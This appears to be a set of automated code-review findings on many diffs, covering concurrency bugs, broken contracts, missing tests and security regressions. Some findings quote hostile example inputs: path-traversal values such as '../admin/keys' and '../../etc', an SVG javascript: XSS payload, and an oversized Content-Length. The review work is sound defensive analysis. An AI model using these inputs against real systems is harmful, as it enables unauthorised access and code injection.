findings.title: Blocking requests.get inside async function stalls the event loop
findings.body:
`fetch_plan_limits` is declared `async` but contains no `await`; it calls the synchronous `requests.get` with `timeout=5`. Because this runs on the event loop thread, every other coroutine — including unrelated in-flight requests — is frozen for the full duration of the HTTP call, up to 5 seconds if `billing.internal` is slow. The `async def` makes this invisible to callers, who reasonably assume awaiting it yields control.

Use the existing async client pattern already established in this module (see `fetch_plan` on lines 5-7), e.g. `async with httpx.AsyncClient() as client: response = await client.get(...)`, or pass in an `httpx.AsyncClient` the same way `fetch_plan` does. If the sync call must stay, wrap it in `anyio.to_thread.run_sync`/`loop.run_in_executor`.

findings.title: tenant_id interpolated unencoded into internal billing URL
findings.body:
`fetch_plan_limits` builds the request URL with an f-string: `https://billing.internal/limits/{tenant_id}`. If `tenant_id` originates from a request parameter (path segment, query string, JSON body) it can contain `/`, `..`, `?` or `#`, which lets a caller reshape the path and reach other endpoints on the internal `billing.internal` host \u2014 for example `tenant_id="../admin/keys"` or `tenant_id="123?admin=true"`. This is an unauthenticated-from-the-internet-facing-edge pivot into an internal service, which is exactly the class of target SSRF/path-injection aims at.

Fix by validating the identifier before use (e.g. assert it matches `^[0-9a-fA-F-]+$` or that it is an int) and/or passing it through `urllib.parse.quote(str(tenant_id), safe="")` so separators cannot escape the intended path segment. Passing query parameters via `params=` rather than string interpolation also helps.

findings.title: No test covers fetch_plan_limits' blocking call behavior
findings.body: fetch_plan_limits is declared async but uses the synchronous `requests` library instead of an async HTTP client, which would block the event loop in production. There is no test in this diff (or apparently in the repo, since fetch_plan itself has no visible test) that would catch this. If someone were to fix this to use httpx.AsyncClient consistently, nothing would fail to alert that the blocking call was ever a problem, nor would anything catch a regression back to a blocking call in the future.

findings.title: Bare `except` swallows KeyboardInterrupt/SystemExit and hides all failures
findings.body:
`except:` with no exception class catches `BaseException`, so it also intercepts `KeyboardInterrupt`, `SystemExit` and `GeneratorExit`. If a shutdown signal or Ctrl-C arrives while `_client.send` is in flight, this function will absorb it and return `None`, making the process appear to continue normally — the opposite of the intent, which is only to make *push failures* non-fatal.

Narrow it to `except Exception:` and log the failure (e.g. `logger.warning("metrics push failed", exc_info=True)`) so that a persistently broken metrics endpoint is diagnosable rather than invisible. As written, every failure mode — bad payload, auth expiry, endpoint down, a `NameError` in `_client.send` — is indistinguishable from success.

findings.title: No test covers the new exception-swallowing behavior
findings.body: The change alters push_metrics so that any exception raised by _client.send is now caught and suppressed, returning None instead of propagating. There is no test in this diff verifying that: (1) a failing send no longer raises, (2) the function returns None on failure, and (3) a successful send still returns the client's result. Without such a test, a future refactor could reintroduce the fatal behavior, or subtly break the fallback path, and nothing would fail.

findings.title: try_consume races on _counters: limit bypass and lost updates
findings.body:
`try_consume` reads `_counters.get(tenant, 0)` at line 15, then hits an `await` at line 18 before writing at line 19. The `await` is a scheduling point, so any number of other `try_consume` coroutines for the same tenant can run between the read and the write: each sees the same stale `current`, each passes the `current + cost > LIMIT` check, and each writes `current + cost`. The result is that N concurrent callers can all be admitted when only one should be, and the final counter reflects a single increment instead of N (lost update).

It also does not acquire `_lock`, which `consume` (lines 9-11) uses to guard exactly this dictionary. Any `consume()` increment that lands between line 15 and line 19 is silently overwritten by the absolute assignment `_counters[tenant] = current + cost`.

Fix: wrap the whole read-check-write sequence in `async with _lock:` (and do not `await` anything other than the lock acquisition inside the critical section), e.g.

```python
async def try_consume(tenant, cost):
    async with _lock:
        current = _counters.get(tenant, 0)
        if current + cost > LIMIT:
            return False
        _counters[tenant] = current + cost
        return True
```

_Also raised by the security agent:_ Rate limit bypassable: unlocked check-then-act with await in between

findings.title: Public API contract unclear: try_consume lacks thread-safety promise
findings.body: The `try_consume` function is a public async function with no docstring explaining its atomicity guarantees. A caller would reasonably expect it to provide the same thread-safe semantics as `consume` (which holds `_lock`), but it does not — there is a race window between the check on line 16 and the write on line 19. This gap is subtle enough that callers acting on an assumption of safety could trigger overages. Callers need explicit documentation of whether this function checks-then-acts atomically or not.

findings.title: try_consume race condition has no concurrent test coverage
findings.body: try_consume reads _counters without holding _lock, then awaits (asyncio.sleep(0)) before writing back, unlike consume which is fully guarded by the lock. This reintroduces the classic check-then-act race: two concurrent calls for the same tenant can both read the same 'current' value, both pass the limit check, and both write, allowing the tenant to exceed LIMIT. No test in this diff exercises concurrent calls to try_consume, so this race would not be caught by any existing or added test.

findings.title: Return shape change breaks existing tuple-unpacking caller
findings.body: `lookup_user` now returns a three-key dict instead of the `(name, email)` tuple it previously returned. The retrieved caller `reports/weekly.py:render_row` does `name, email = lookup_user(user_id)`, which will now raise `ValueError: too many values to unpack (expected 2)` (and even for a two-key dict it would bind the *keys*, not the values, producing silently wrong output). Either keep returning a tuple, return a `NamedTuple`/dataclass that still unpacks as `(name, email)`, or update every caller — including `reports/weekly.py:6` — in the same change.

findings.title: Docstring describes wrong return type and shape
findings.body:
The docstring states the function returns `(name, email)` as a tuple, but the function now returns a dictionary with keys `name`, `email`, and `tier`. This will cause callers reading the documentation to use the function incorrectly, attempting tuple unpacking when they should access dictionary keys. The repository context shows existing callers (reports/weekly.py) unpack the return value as `name, email = lookup_user(user_id)`, which will break with the new return type.

_Also raised by the correctness agent:_ Docstring still documents the old tuple return contract

findings.title: No test catches lookup_user's tuple→dict contract break
findings.body: lookup_user now returns a dict instead of a (name, email) tuple. The existing caller reports/weekly.py:render_row does `name, email = lookup_user(user_id)`, which will now unpack the dict's keys instead of values (or raise, depending on dict size), silently or loudly breaking. No test in this change exercises render_row or lookup_user's return shape, so this regression would not be caught by any existing suite.

findings.title: WriteSettlement always returns nil, hiding insert failures
findings.body:
The error from `db.Exec` is bound to an `err` scoped to the `if` statement on line 15; it is only logged and never propagated. Lines 18-19 then declare a fresh `var err error` (always nil) and return it, so `WriteSettlement` returns `nil` on every path after validation — including when the settlement INSERT fails. Any caller that checks `if err := WriteSettlement(...); err != nil` will conclude the settlement was persisted when it was not, which means silent loss of financial records (and, in a transaction/retry wrapper, a commit over a missing row).

Fix by returning the error directly, mirroring `WriteEntry` above:

```go
if _, err := db.Exec(...); err != nil {
    log.Printf("settlement insert failed: %v", err)
    return err
}
return nil
```

_Also raised by the security agent:_ WriteSettlement always returns nil — failed inserts reported as success

findings.title: No test would catch WriteSettlement always returning nil
findings.body: WriteSettlement discards the actual db.Exec error (only logs it) and returns a separately declared `var err error` which is always nil (lines 18-19). This means the function reports success even when the insert fails. There is no test in this diff exercising WriteSettlement with a failing Exec (e.g. via a mock/stub DB) that asserts the returned error is non-nil. Since the sibling function above it returns err directly and presumably has or would have such a test, this new function's regression in behavior would pass unnoticed.

findings.title: Mutable default argument accumulates failures across calls
findings.body:
`attempted=[]` is evaluated once at function definition time, so every call that does not pass `attempted` explicitly shares the same list object. Line 10 appends to that shared list and line 11 returns it, so the second call returns the failures from the first call plus its own, the third returns all three, and so on. Callers that treat the return value as "recipients that failed in this batch" will see stale entries, and the list grows without bound for the lifetime of the process.

Fix with the standard sentinel, matching the defensive copy already used on line 2 of this same module:

    def send_with_retries(recipients, attempted=None):
        attempted = list(attempted) if attempted else []

Separately, note the function is named `send_with_retries` but the loop on lines 8-10 dispatches each recipient exactly once with no retry — either the name or the body is wrong.

_Also raised by the security agent:_ Shared mutable default accumulates recipients across calls unboundedly

_Also raised by the docs agent:_ Public function with mutable default argument lacks documentation

findings.title: No test exercises send_with_retries or its mutable default bug
findings.body: send_with_retries uses a mutable default argument `attempted=[]`, which will persist and accumulate across calls when the caller relies on the default. No test file is included in this diff, so nothing would catch this bug (e.g. calling the function twice and observing that the second call's returned list unexpectedly contains entries from the first call), nor would anything verify the basic retry behavior (that failed dispatches are collected and returned).

findings.title: Rounding boundary changed from >= 0.5 to > 0.5 inside a rename PR
findings.body: `calc_rounding` returned `1 if line.remainder_cents >= 0.5 else 0`; the renamed `compute_rounding` returns `1 if line.remainder_cents > 0.5 else 0`. Every other function in this diff is an unmodified body with only the name changed, so this is the one behavioural change and it is not mentioned anywhere. A remainder of exactly 0.5 cents now rounds down instead of up — that is standard half-up rounding being turned into something else, and on money it will show up as off-by-one-cent discrepancies against previously issued invoices and against any reconciliation fixtures. If the change is intentional it needs its own PR, a test at the 0.5 boundary, and a note about restating existing totals; if it is not, restore `>=`.

findings.title: Boundary change in compute_rounding untested and unnoted
findings.body: The rename from calc_rounding to compute_rounding was accompanied by a silent logic change: the comparison operator changed from `>=` to `>`. This changes the result for line.remainder_cents == 0.5 (previously rounds up, now does not). No test file is included in this diff, so nothing would catch this regression if it is unintended — a caller relying on the old boundary behavior would silently get a different rounding result at exactly 0.5.

findings.title: Off-by-one slice in page_of_sorted drops one record per page
findings.body:
`page_of_sorted` slices `ordered[start : start + PAGE_SIZE - 1]`, returning at most `PAGE_SIZE - 1` records, while `start` still advances by a full `PAGE_SIZE` per page (line 11). The record at index `start + PAGE_SIZE - 1` is therefore never returned by any page: it is excluded from page N by the short slice and skipped by page N+1, whose start is `(page+1) * PAGE_SIZE`. Any consumer paginating an export through this function will silently lose one record out of every PAGE_SIZE. The existing `page_of` on line 6 uses `records[start : start + PAGE_SIZE]`, which is the correct form; line 12 should match it.

_Also raised by the docs agent:_ page_of_sorted returns wrong page size

findings.title: New paginated-sort function lacks tests and has an off-by-one slice
findings.body: page_of_sorted slices ordered[start : start + PAGE_SIZE - 1], which returns one fewer element than PAGE_SIZE per page (dropping the last record of each page), unlike page_of which correctly slices to start + PAGE_SIZE. No test exercises this function, so nothing would catch a caller receiving a truncated page or missing records across page boundaries.

findings.title: Removed None guard crashes on invoices without a purchase order
findings.body:
`Invoice.purchase_order` is typed `str | None` and documented as set for only ~1 in 20 accounts. The rewrite calls `invoice.purchase_order.upper()` unconditionally, so `header_lines` will raise `AttributeError: 'NoneType' object has no attribute 'upper'` for the ~95% of invoices with no PO. Restore the conditional append (or build the PO line only when `purchase_order is not None`) while keeping the list-literal style for the first line.

_Also raised by the docs agent:_ Removed null guard without documentation update

findings.title: Removed null guard on purchase_order has no test covering the null case
findings.body: The previous code guarded `invoice.purchase_order.upper()` with an `is not None` check; that guard is now gone, so any invoice with `purchase_order = None` (per the model docstring, roughly 19 of 20 customers) will raise AttributeError. No test in this diff exercises `header_lines` with a None purchase_order, so this regression would not be caught by any test suite run.

findings.title: File handle leaks on early return and exception paths
findings.body:
`fh = open(path)` is only closed on the single happy path at line 16. If the header does not match, line 14 returns `None` with the handle still open; likewise any exception from `next(reader)` (line 12) or `list(reader)` (line 15) escapes without closing. Under CPython this is masked by refcounting, but it is nondeterministic on other runtimes and will exhaust descriptors under a loop of mismatched files. Use `with open(path) as fh:` around the whole body, exactly as `read_rows` does on line 5.

_Also raised by the security agent:_ Leaked file handle on header-mismatch path can exhaust descriptors

findings.title: read_validated has no tests; leaked fd on mismatch path uncaught
findings.body: The new function read_validated opens a file handle and only closes it on the success path (line 16). If header != expected_header, it returns None at line 14 without closing fh, leaking the file descriptor. No test exercises either the matching-header or mismatched-header behavior, so this leak (and any future regression in the validation logic) would not be caught.

findings.title: Retry wraps non-idempotent charge(), risking duplicate charges
findings.body:
`billing.gateway.charge` is explicitly documented as NOT idempotent: "each call creates a new charge." Wrapping it in `@retry(attempts=3)` means any transient failure that occurs *after* the gateway accepted the POST (timeout on the response, connection reset, 5xx emitted post-commit) will be retried and create a second (or third) charge against the customer's card. Note the contrast with `fetch_charge` above, which retries `get_charge`, a call the docstring marks "Safe to repeat" — the retry is correct there and not here.

The gateway already provides the fix: it supports an `Idempotency-Key` header. Generate a key once in `charge_card` (outside the retried call, so all attempts share it) and thread it through `charge(...)` so the gateway collapses retries into a single charge. If `charge()` cannot yet accept a key, this decorator should be removed until it can.

_Also raised by the security agent:_ Retry wraps non-idempotent charge() with no Idempotency-Key

findings.title: Retrying non-idempotent API without documented safety mechanism
findings.body: The new `charge_card()` function at line 11–12 wraps `billing.gateway.charge()` with `@retry(attempts=3)`. However, the docstring of `charge()` explicitly states it is "NOT idempotent: each call creates a new charge" and requires an Idempotency-Key header for safe retries. By retrying `charge()` without that header, `charge_card()` violates the contract of its dependency. A caller could use this function believing retries are safe, but each retry creates a new charge. Either: (1) add a docstring to `charge_card()` explaining that an Idempotency-Key must be passed and documented in how the gateway call is made, (2) ensure an Idempotency-Key is being set inside `charge_card()` (not visible in this diff), or (3) remove the retry decorator since the underlying call cannot be safely retried without additional context.

findings.title: New retry-wrapped charge_card has no test guarding against duplicate charges
findings.body: charge_card wraps billing.gateway.charge, which is explicitly documented as NOT idempotent (each call creates a new charge) unless an Idempotency-Key is passed. Retrying it on transient failures (e.g. timeout after the charge succeeded server-side) can create duplicate charges. There is no test in this diff exercising retry behavior for charge_card, so a regression where retries double-charge would go undetected — nothing currently fails if this is wrong.

findings.title: expires_within subtracts naive now() from tz-aware expires_at
findings.body: `cutoff` is built from `datetime.now()` with no tzinfo, while `Invite.expires_at` is documented as always timezone-aware UTC (set from `datetime.now(timezone.utc)`). Subtracting a naive datetime from an aware one raises `TypeError: can't subtract offset-naive and offset-aware datetimes`, so line 10 fails on every call — the function can never return. Use `datetime.now(timezone.utc)` as `is_expired` on line 5 already does. Note that even if the subtraction succeeded, a naive local-clock `now()` would be silently offset from UTC by the host's timezone, so simply catching the error is not a fix.

findings.title: Timezone mismatch in expires_within contradicts Invite contract
findings.body: The `expires_within` function creates a timezone-naive cutoff using `datetime.now()` at line 9, then subtracts it from `invite.expires_at`, which is documented in the Invite class as always being timezone-aware UTC. This comparison will raise a TypeError at runtime. Either the function should use `datetime.now(timezone.utc)` to honor the documented contract, or the contract documentation for the Invite class is now inaccurate. Given that `is_expired` (line 5) correctly uses `datetime.now(timezone.utc)`, the bug is in `expires_within`, not the contract.

findings.title: No test would catch naive/aware datetime subtraction bug
findings.body: expires_within() computes datetime.now() (naive) and subtracts it from invite.expires_at, which per the model docstring is always tz-aware. Subtracting a naive datetime from an aware one raises TypeError in Python. There is no test in this diff exercising expires_within, so this defect would ship silently and only surface at runtime when the function is called.

findings.title: contactEmail dereferences optional billingContact without a guard
findings.body:
`Account.billingContact` is declared optional (`billingContact?`) and documented as "Absent until the customer completes onboarding". `contactEmail` reads `.email` off it directly, so for any pre-onboarding account this throws `TypeError: Cannot read properties of undefined (reading 'email')` at runtime. The sibling function on line 4 handles exactly this case with `?.` plus a fallback. Mirror that: e.g. `return account.billingContact?.email.toLowerCase() ?? "";` — or, if callers genuinely require an address, change the return type to `string | undefined` and let them handle absence, rather than promising a `string` the function cannot always produce.

_Also raised by the docs agent:_ Public function omits that billingContact may be absent

findings.title: contactEmail crash path is untested
findings.body: contactEmail accesses account.billingContact.email without a null check, even though billingContact is optional per the Account type. There is no test in this diff exercising an account without a billingContact, so a call that throws at runtime would not be caught by any existing test suite.

findings.title: timeout parameter unit mismatch with fetch() contract
findings.body: The call to `fetch()` passes `timeout=30`, which according to the `fetch()` docstring is interpreted as milliseconds, not seconds. This gives a 30ms timeout when the generous timeout mentioned in the PR description suggests 30 seconds was intended. Either the timeout value should be multiplied by 1000 (e.g., `timeout=30000`), or the code should be documented to explain the 30ms choice if that is truly intentional.

findings.title: timeout=30 is 30 milliseconds, not 30 seconds
findings.body: `fetch()` documents `timeout` as MILLISECONDS ("Callers wanting seconds must multiply"), and passes it straight through as `timeout_ms`. Passing `30` gives the partner API a 30 ms budget — and since the docstring says retries share the same budget, all 3 retries fall inside those 30 ms. Against an API the PR description itself calls slow, this call will effectively always time out rather than being "generous". Use `timeout=30_000` (or whatever the intended second count multiplied by 1000) and confirm the retry budget is sized for it.

findings.title: No test would catch the timeout unit mismatch in sync_partner_catalogue
findings.body: sync_partner_catalogue calls fetch(url, timeout=30) with no accompanying test. clients/http.py documents that `timeout` is in milliseconds, and the PR description says the timeout was 'set generously since their API is slow,' suggesting the author intended 30 seconds. A 30ms timeout would cause every real call to fail, but since there is no test asserting the value or units passed to fetch, this defect would ship undetected.

findings.title: Index duplicates existing invoices_tenant_created_idx from migration 0007
findings.body: `invoices_tenant_recent_idx` is defined on `invoices (tenant_id, created_at DESC)` — byte-for-byte the same table, columns and sort order as `invoices_tenant_created_idx`, already applied on 2025-11-02 by migration 0007. `IF NOT EXISTS` matches on index *name*, not on definition, so it will not suppress this: Postgres will happily build a second, fully redundant index. The cost is a duplicated build on a large table plus permanent write amplification and storage on every invoice insert/update, with no query benefit — the planner already has this exact index. Drop this statement; if the intent was a different shape (e.g. a partial index on recent rows, or including `status`), the definition needs to actually differ.

findings.title: Referer header now logged unscrubbed, leaking auth tokens into logs
findings.body:
The removed branch passed the `Referer` value through `_scrub_uri(value, extra_param_keys)` before logging it; the replacement copies `request.headers[header]` verbatim for every header including `Referer`. Per `jupyter_server/auth/identity.py`, notebook URLs are handed out as `{base}?token={token}`, so the browser sends that token back in the Referer header on every subresource request. On any 5xx this logging path writes a live auth token into the server log, where anyone with log read access (or a log shipper/aggregator) can replay it to impersonate the user. Restore the `_scrub_uri` call for `Referer` (and keep scrubbing any other URI-bearing header) rather than logging the raw value. Note also that `extra_param_keys` is now unused in this function, which is a signal that the sanitisation was dropped rather than moved.

_Also raised by the security agent:_ Removing Referer scrubbing writes auth tokens into the logs

findings.title: No test guards against unscrubbed Referer token leaking into logs
findings.body: The change removes the call to _scrub_uri for the Referer header before logging, so the raw header (which per token_authenticated_url can contain the auth token as a query parameter) is now logged verbatim. No test in this diff (or referenced) asserts that Referer values are scrubbed before being written to the log, so this regression would not be caught by any existing test suite.

findings.title: Comment about Referer handling should be updated or removed
findings.body: Line 3 selects 'Referer' as one of four headers to log, but the previous behavior scrubbed this header specifically due to token exposure risk. The code now logs Referer unscrubbbed without any comment explaining the change in security posture or why this is now acceptable.

findings.title: Dropping 'xlinkhref' disables URL scheme checks on xlink:href
findings.body:
Line 6 narrows the guard to `href`/`src`, so an attribute named `xlinkhref` no longer reaches `isAnchorLinkAllowed(value)` on line 7 and instead falls through to whatever the function's default return is. Since the file header states that rendered attributes come from end-user-submitted markdown and that `validateProp` is the only barrier before the DOM, markup such as `<svg><a xlink:href="javascript:alert(1)">` will now be emitted unchecked against `unsafeLinkPrefix` (`javascript:`, `data:text/html`, `vbscript:`). `xlink:href` is script-executing in SVG exactly like `href`, so this reintroduces a stored XSS. Restore `|| attribute === 'xlinkhref'` (and consider also matching the colon-form `xlink:href`, depending on how the parser normalises attribute names before calling this).

_Also raised by the security agent:_ xlink:href no longer scheme-checked, reintroducing SVG XSS sink

findings.title: Removed xlinkhref check has no accompanying test to catch the regression
findings.body: The change removes 'xlinkhref' from the list of attributes routed through isAnchorLinkAllowed, meaning javascript:/data:/vbscript: URIs placed in an xlink:href attribute would no longer be blocked. No test file is included in this diff. If there was a prior test asserting that xlinkhref values are sanitised, it should now be failing after this change (and its absence from the diff suggests it may not exist, or was not run/updated). If no such test exists, this behaviour change is entirely uncovered — nothing in the test suite would catch a malicious xlink:href payload passing through unsanitised.

findings.title: Unvalidated project query param reaches path construction
findings.body:
`projectQueryParameter` comes straight from the request query string and, after this change, flows into the list operation with no validation at all. The file-backed DAO's `buildPath` does `filepath.Join(d.Folder, project, kind)` and its doc comment states it performs no validation of its own because "callers are required to have validated the names before this point." With `ValidateID` gone, a value such as `../../etc` or `..%2f..` traverses outside the storage root, so listing can read documents belonging to other projects or outside the data folder entirely.

Note also that the remaining check on line 4 only compares the query parameter against `parameters.Project` when a path project is present; when the path project is empty the query value is used unchecked, so the equality check is not a substitute for validation. Restore the `common.ValidateID(projectQueryParameter)` guard (returning `HandleBadRequestError`) before the value is used.

_Also raised by the security agent:_ Project query parameter reaches filesystem path with validation removed

findings.title: Removed input validation has no test coverage change
findings.body: The call to common.ValidateID on projectQueryParameter was removed, but no test file in this diff exercises the list() path with a malicious or malformed project query parameter (e.g. containing path traversal sequences like '../'). Since buildPath explicitly documents that callers must validate names before use, this change removes that guarantee silently. If a test existed asserting a 400 response for invalid project names in the query parameter, it should have failed or been updated as part of this diff — its absence suggests no such test exists, so this behavior change is unverified either way.

findings.title: Buffer pre-reserved from client-declared contentLength (remote OOM)
findings.body:
`multipart.NewRW().Reserve(contentLength)` commits memory up front based on `contentLength`, which for an S3 `UploadPart` request originates from the client's `Content-Length` header (the handler signature on line 2 takes it as a parameter, and nothing in this function validates it). Before this change the RW grew incrementally as `io.Copy` on line 8 consumed the body, so the peak allocation was bounded by the bytes the client actually sent. Now a client can send `Content-Length: 5000000000` with a trivial or slowly-dribbled body and force the allocation immediately — several concurrent such requests will OOM the process, and no upload needs to complete for the memory to be taken.

Suggested fix: clamp the reservation to a sane ceiling (e.g. `min(contentLength, maxPartSize)` or a fixed initial-capacity cap such as a few MiB) and let the RW grow from there, so the allocation is driven by bytes received rather than bytes declared. Also guard the negative/unknown case: `contentLength` is `-1` for chunked or unknown-length bodies, and it is not visible here what `Reserve` does with a negative argument.

_Also raised by the correctness agent:_ Buffer reserved from client-declared contentLength before reading body

findings.title: No test covers Reserve(contentLength) behavior or its bounds
findings.body: The change switches from an incrementally-growing RW buffer to one that pre-reserves contentLength bytes up front via Reserve(). This is exactly the kind of change (declared-length-driven allocation) that can reintroduce or fix a resource-exhaustion issue depending on whether contentLength is validated/bounded elsewhere. No test in this diff exercises Reserve with a large, mismatched, or malicious contentLength value, so a future change that removes bounds checking or misuses this call would not be caught by any existing test.

findings.title: Removed comment about buffer growth no longer applies
findings.body: The comment previously stated 'The RW grows a page at a time as the body is read.' This is no longer accurate after the code was changed to pre-reserve the buffer with `Reserve(contentLength)`. The new behavior allocates the full content length upfront rather than growing incrementally. The comment should be updated to reflect this change in behavior.

findings.title: Unknown/negative contentLength (-1) passed to Reserve unguarded
findings.body: For chunked or otherwise unsized request bodies the declared length is conventionally `-1` (and `0` for an empty declaration). `Reserve` is handed that value directly with no guard. Depending on its implementation this is either a wasted no-op or a panic on a negative capacity. Guard the call, e.g. only reserve when `contentLength > 0`.

findings.title: Default S3 scheme silently changes from https to http
findings.body:
The old expression `"http" if request.meta.get("is_secure") is False else "https"` only selected plaintext when the caller explicitly set `is_secure = False`; every other value — including the missing-key case where `.get()` returns `None` — produced `https`. The new expression `"https" if request.meta.get("is_secure") else "http"` treats `None` (and any other falsy value) as a request for plaintext, so requests that do not set `meta["is_secure"]` at all are now sent over `http://` to `{bucket}.s3.amazonaws.com` on line 6. That downgrades every default S3 fetch — and any AWS auth headers attached to it — to an unencrypted channel, which is both a behaviour change for existing callers that never set the flag and a confidentiality loss.

If the goal was only to drop the `is False` idiom, preserve the default explicitly, e.g. `scheme = "http" if request.meta.get("is_secure") is False else "https"` (unchanged) or `scheme = "https" if request.meta.get("is_secure", True) else "http"`.

_Also raised by the security agent:_ S3 handler defaults to plaintext HTTP, silently disabling TLS

findings.title: No test covers the default scheme when is_secure is unset
findings.body: The change alters the default behaviour: previously omitting request.meta['is_secure'] (or setting it to None) defaulted to 'https', now it defaults to 'http'. This is a meaningful behaviour change to a security-relevant default, and no test file is present in the diff to assert what scheme is chosen when 'is_secure' is absent or falsy-but-not-False (e.g. None, 0, ''). Without such a test, this default-flip could regress silently in either direction in the future.

findings.title: DELETE requests now request "push" access, dropping the delete action
findings.body:
The old switch mapped `http.MethodDelete` to the distinct `"delete"` action. The new boolean collapse treats every non-GET/HEAD method as `"push"`, so a DELETE request now authorises against push permission. Two concrete consequences: (1) an account granted push but not delete can now delete tags/manifests — exactly the separation the config documentation says is intentional; (2) an account granted only delete can no longer delete, since the policy check will look for push. Restore the explicit `case http.MethodDelete: action = ActionDelete` arm (or an equivalent `if m == http.MethodDelete` branch) so the three actions stay distinct.

_Also raised by the security agent:_ DELETE now authorised as "push", bypassing delete permission

findings.title: No test guards against DELETE being mapped to 'push' instead of 'delete'
findings.body: The change removes the explicit http.MethodDelete -> "delete" mapping and instead maps any non-GET/HEAD method (including DELETE) to "push". This means an account with only push permission could now perform deletes, since nothing in the codebase's test suite (none shown in this diff) exercises the mapping from a DELETE request to the resulting action string. If this logic is wrong, no test would fail — the behavior change is silent and only surfaces as a permission bypass in production or manual testing.

findings.title: Delete operations now map to 'push' action, contradicting documented contract
findings.body: The new logic maps all non-GET/HEAD requests to the 'push' action (line 5-6). This includes DELETE requests, which previously mapped to the distinct 'delete' action. However, the repository documentation (pkg/api/config/config.go) explicitly states: 'The three actions are distinct on purpose: an account may be allowed to push new tags without being allowed to delete existing ones.' This change silently merges delete into push, making it impossible to grant push permission without also granting delete permission — a documented security boundary that is now broken.

findings.title: Unknown/OPTIONS methods now default to "push" instead of "pull"
findings.body: The removed `default:` arm mapped any method outside the enumerated set (OPTIONS, TRACE, CONNECT, or a non-standard verb) to the least-privileged `"pull"` action. The new condition inverts that: anything that is not GET or HEAD requires push. Preflight OPTIONS requests and similar benign verbs will now be denied for pull-only accounts, and the fail-open/fail-closed default has silently changed direction. If the intent was to keep an explicit allow-list, express it as such: default to "pull" and set "push" only for POST/PATCH/PUT, "delete" only for DELETE.

findings.title: Size guard clears the whole cache, discarding the entry just written
findings.body: `get_tenant_fresh` writes `tenant` into `_CACHE`, then, if the cache has grown past 1000 entries, calls `_CACHE.clear()`. That drops the entry that was just inserted along with every other tenant, so a caller that does `get_tenant_fresh(t)` followed by `get_tenant(t)` gets `None` back even though the refresh succeeded — the exact sequence the pair of functions exists to support. It also produces a periodic full flush: every 1001st refresh forces all callers back to `_fetch`, a thundering-herd cliff rather than a gradual eviction. Use a bounded eviction policy instead (e.g. `collections.OrderedDict` with `popitem(last=False)`, or `functools.lru_cache`/an LRU dict), and if a wipe really is intended, re-insert or check the size *before* storing so the fresh value survives.

findings.title: New caching logic (fetch, store, evict-at-1000) is untested
findings.body: get_tenant_fresh introduces behavior beyond a simple getter: it fetches a fresh value, writes it into _CACHE, and clears the entire cache once it exceeds 1000 entries. None of this is exercised by any test in the diff, so a bug in the eviction threshold, a wrong clear-vs-evict-one strategy, or a failure to actually refresh the cached value would go undetected.

findings.title: README documents renamed flag as `--workers`
findings.body:
The README at line 7 documents the `--workers` flag, but the code on line 6 of cli.py has renamed it to `--concurrency`. A user reading the README and running `--workers` would get an argument error. Update the documentation to reflect the new flag name.

_Also raised by the correctness agent:_ README still documents the removed --workers flag

findings.title: Renaming --workers changes args.workers dest and breaks callers/scripts
findings.body: argparse derives the destination attribute from the long option name, so this change replaces `args.workers` with `args.concurrency`. Any code in this package that reads `args.workers` will now raise `AttributeError` at runtime, and any existing invocation (shell scripts, CI jobs, container entrypoints, docs) passing `--workers N` will fail with "unrecognized arguments". If the rename is intended, either keep the old spelling as an accepted alias with an explicit dest, e.g. `p.add_argument("--concurrency", "--workers", dest="concurrency", type=int, default=4)`, or update every consumer of `args.workers` in the same change. No repository context was retrieved, so the set of consumers could not be verified here.

findings.title: Docstring contradicts return type change
findings.body: The docstring states 'Return the total number of API calls this month as an integer.' but the function now returns a dictionary mapping days to counts. A caller relying on the documented contract and expecting an integer will receive a dict and fail. Update the docstring to describe the new return format.

findings.title: Return type changed from int to dict, breaking existing callers
findings.body: `monthly_usage` previously returned a single scalar integer (`_db.scalar(...)`) and its docstring still promises "the total number of API calls this month as an integer". It now returns a `dict` of day -> count. Any caller doing arithmetic or comparison on the result (`monthly_usage(a) > limit`, `+`, formatting as a number) will now silently misbehave or raise `TypeError`. If the per-day breakdown is wanted, add it as a new function (e.g. `daily_usage`) or a keyword flag, and keep `monthly_usage` returning the total; at minimum update the docstring and audit/adjust every call site in the same change.

findings.title: No test covers new dict-shaped return of monthly_usage
findings.body: monthly_usage's return type and contract changed from an integer total to a dict keyed by day (e.g. {day: count}), but no test file is present in this diff to verify the new grouping/aggregation logic or the shape of the returned data. If the GROUP BY or key/value mapping were wrong (e.g. wrong column name, off-by-one in aggregation), nothing in this change would catch it. Also note the docstring still says "Return the total number of API calls this month as an integer," which is now inaccurate — any caller relying on the old contract could break silently.

findings.title: Renaming page_size to limit breaks keyword-argument callers
findings.body:
`list_invoices` is a module-level function whose second parameter was renamed from `page_size` to `limit`. Any existing call site written as `list_invoices(tenant_id, page_size=100)` will now raise `TypeError: list_invoices() got an unexpected keyword argument 'page_size'` at runtime rather than failing at import or type-check time. Positional callers are unaffected, so this can pass a smoke test and still break in production.

Either update every call site in the same change, or accept both spellings for a release, e.g. keep `page_size=None` as a deprecated alias that overrides `limit` when supplied and emits a `DeprecationWarning`. Note also that the docstring on line 6 still documents `page_size`, which suggests call sites may not have been swept.

findings.title: Docstring parameter name does not match signature
findings.body: The docstring documents a parameter called 'page_size', but the function signature on line 1 now declares it as 'limit'. A caller reading the docstring would use the wrong parameter name. Update line 6 to reference 'limit' instead of 'page_size'.

findings.title: Renamed parameter has no test verifying call sites still work
findings.body: The parameter `page_size` was renamed to `limit`. If any caller invokes `list_invoices` with `page_size=...` as a keyword argument, this is now a breaking change (TypeError). No test exercises `list_invoices` with keyword arguments to catch this, and no test verifies the docstring's `page_size` reference was also not updated to match the new parameter name.

findings.title: `from adapters import HTTPAdapter` is not a package-relative import
findings.body: `adapters` is a sibling module inside the `requests` package, but this is an absolute import. On Python 3 (and on Python 2 in any module with `absolute_import`) it will raise `ImportError: No module named 'adapters'` at import time of `requests.sessions`, i.e. `import requests` fails outright. Every other import in this file is relative (`from .utils import ...`, `from .packages.urllib3.poolmanager import PoolManager`). Change it to `from .adapters import HTTPAdapter`, and watch for a circular import since `adapters` likely imports from `models`/`sessions`.

findings.title: TLS verify/cert arguments silently dropped in new request() path
